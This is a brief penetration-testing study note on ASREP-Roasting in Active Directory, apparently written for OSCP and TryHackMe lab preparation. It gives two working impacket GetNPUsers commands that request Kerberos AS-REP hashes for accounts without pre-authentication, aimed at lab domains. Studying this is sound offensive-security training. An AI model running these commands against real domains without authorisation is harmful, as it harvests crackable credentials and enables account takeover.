## ASREP-Roasting

---

ASREPRoasting occurs when a user account has the privilege "Does not require pre-authentication" set.
This means that the account does not need to provide valid identification before requesting a 
Kerberos Ticket on the specified user account.


Utilizing impacket-GetNPUsers will give us the TGT of users with this privileges set.

```
impacket-GetNPUsers -dc-ip 10.10.18.74 "spookysec.local/svc-admin" -no-pass
```

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.corp/ -no-pass -usersfile ../Exploiting/OSCP_Prep/THM/ActiveDirectory/Reset/users.txt
```
